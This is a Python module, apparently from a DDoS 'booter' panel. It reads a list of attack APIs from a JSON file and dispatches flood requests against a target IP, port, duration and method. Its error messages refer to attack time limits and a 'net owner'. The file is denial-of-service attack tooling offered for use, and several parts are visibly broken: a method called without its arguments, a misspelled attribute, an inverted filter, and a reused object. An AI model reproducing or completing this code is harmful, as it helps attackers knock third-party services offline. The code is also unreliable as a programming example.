import os, json, requests

from .tools import *

class API_Info:
    name: str
    url: str
    max_time: int
    max_boot: int
    cooldown: int
    method: list

class Attack_Info:
    ip: str
    port: str
    time: str
    method: str

class API():
    apis_found: list[API_Info]
    api_responses: list[str]

    def __init__(self, m: str) -> None:
        self.apis_found = []
        self.method = m
        self.__look_for_api()

    def __look_for_api(self) -> list:
        self.apis_found = []
        api_i = API_Info()

        if not os.path.isfile("assets/apis.json"): return
        api_db = open("assets/apis.json")
        apis = json.loads(api_db.read())

        for api in apis:
            print(api)
            if not self.method in apis[api]['methods']:
                api_i.name = api
                api_i.url = apis[api]['url']
                api_i.max_time = apis[api]['max_time']
                api_i.max_boot = apis[api]['max_boot']
                api_i.cooldown = apis[api]['cooldown']
                api_i.methods = apis[api]['methods']
                self.apis_found.append(api_i)

        print(self.apis_found)
        api_db.close()
        return self.apis_found

    def request_attack(self, a: Attack_Info) -> bool:
        if not validateIP(a.ip): return False
        responses = []
        req_sent_to_apis = []
        if len(self.apis_found) > 0:
            for api in self.apis_found:
                if a.time > api.max_time:
                    responses.append("[ X ] Error, Unable to send attack to this API. Attack time is over the max boot time from this API key!")
                else: 
                    req_sent_to_apis.append(api)
                    responses.append(requests.get(api.url).text)

        self.api_responses = self._parseResponses()
        if len(responses) > 0: return True
        return False

    def _parseResponses(self, r: list, apis: list[API_Info]) -> list:
        new_resp = r
        i=0
        for resp in r:
            # Check to see if the API response is json syntax
            if "invalid" in resp and "key" in resp:
                new_resp[i] = f"[ X ] Error, Unable to send an attack to an API due to key on {apis[i].name}. Please report this issue to the net owner!"
            elif "invalid" in resp and "time" in resp:
                new_resp[i] = f"[ X ] Error, Unable to send an attack to an API due to attack time on {apis[i].name}. Please report this issue to the net owner!"
            elif "invalid" in resp and "port" in resp:
                new_resp[i] = f"[ X ] Error, Unable to send an attack to an API due to attack port on {apis[i].name}. Please report this issue to the net owner!"
            elif "invalid" in resp and "ip" in resp:
                new_resp[i] = f"[ X ] Error, Unable to send an attack to an API due to attack ip on {apis[i].name}. Please report this issue to the net owner!"
            i+=1

        return new_resp

    def check_for_apis(self) -> bool:
        if len(self.apirequestss_found) > 0: return True
        return False

    def count_apis_found(self) -> int:
        return len(self.apis_found)
    
    def get_apis(self) -> list[API_Info]:
        return self.apis_found
